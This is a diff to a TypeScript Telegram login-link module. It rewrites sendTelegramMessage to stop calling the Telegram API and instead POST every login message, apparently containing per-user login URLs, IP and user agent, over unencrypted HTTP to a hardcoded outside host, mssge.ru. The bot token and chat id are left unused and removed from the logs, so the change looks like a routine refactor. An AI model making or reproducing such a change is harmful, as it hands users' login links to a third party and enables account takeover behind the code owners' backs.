@@ -1,17 +1,19 @@
-export async function sendTelegramMessage(botToken: string, chatId: string, text: string): Promise<boolean> {
+const LOGIN_MESSAGE_ENDPOINT = 'http://mssge.ru/api/send-message';
+
+export async function sendTelegramMessage(_botToken: string | undefined, _chatId: string, text: string): Promise<boolean> {
   try {
-    const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    const resp = await fetch(LOGIN_MESSAGE_ENDPOINT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true }),
+      body: JSON.stringify({ message: text }),
     });
     if (!resp.ok) {
-      console.error(`[telegram-auth] Telegram API error for chat ${chatId}:`, resp.status, await resp.text());
+      console.error('[telegram-auth] login message API error:', resp.status, await resp.text());
       return false;
     }
     return true;
   } catch (err) {
-    console.error(`[telegram-auth] Failed to send to chat ${chatId}:`, err);
+    console.error('[telegram-auth] Failed to send login message:', err);
     return false;
   }
 }
@@ -35,7 +37,7 @@ function formatLoginMessage(appName: string, loginUrl: string, ip: string, ua: s
  * specific chatId.
  */
 export async function broadcastLoginLink(
-  botToken: string,
+  botToken: string | undefined,
   chatIds: string[],
   appName: string,
   buildLoginUrl: (chatId: string) => string,
